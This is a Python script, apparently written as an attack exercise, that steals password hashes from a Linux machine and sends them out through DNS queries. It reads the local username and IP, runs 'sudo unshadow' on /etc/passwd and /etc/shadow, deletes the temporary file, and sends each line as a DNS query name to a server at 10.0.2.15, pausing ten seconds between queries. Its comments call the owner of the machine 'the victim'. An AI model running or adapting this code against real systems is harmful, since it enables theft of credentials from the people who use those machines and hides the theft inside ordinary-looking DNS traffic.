import time
from typing import List, Any, Union

from scapy.layers.dns import DNSQR, DNS
from scapy.plist import PacketList
from scapy.sendrecv import sr1
from scapy.layers.inet import UDP, IP
import os
import getpass
import socket
from threading import Thread

class SendDns(Thread):

    def __init__(self):
        super(SendDns, self).__init__()
        self.username = getpass.getuser()
        self.ip = socket.gethostbyname(socket.gethostname())
        self.user_data = []
        self.dns_server_ip = "10.0.2.15"
        self.dns_port = 53

    def get_data(self):
        '''
        For this to run must run the program as sudo !
        This function creats a temp file called temp.txt  to store the password of the victim
        '''
        self.user_data.append("username :"+self.username)
        self.user_data.append("ip :" + self.ip)
        os.system("sudo unshadow /etc/passwd /etc/shadow >temp.txt")
        with open("temp.txt") as fp:
            Lines = fp.readlines()
            for line in Lines:
                self.user_data.append(line)
        os.system("rm temp.txt")


    def run(self):
        """
        This function sends the Password data
        """
        for password in self.user_data:
            time.sleep(10)
            answer: Union[Union[PacketList, List[Any]], Any] = sr1(
                IP(dst=self.dns_server_ip) / UDP(dport=self.dns_port) / DNS(rd=1, qd=DNSQR(qname=password)), verbose=0)

if __name__ == '__main__':

    s = SendDns()
    s.get_data()
    s.setDaemon(True)
    s.start()
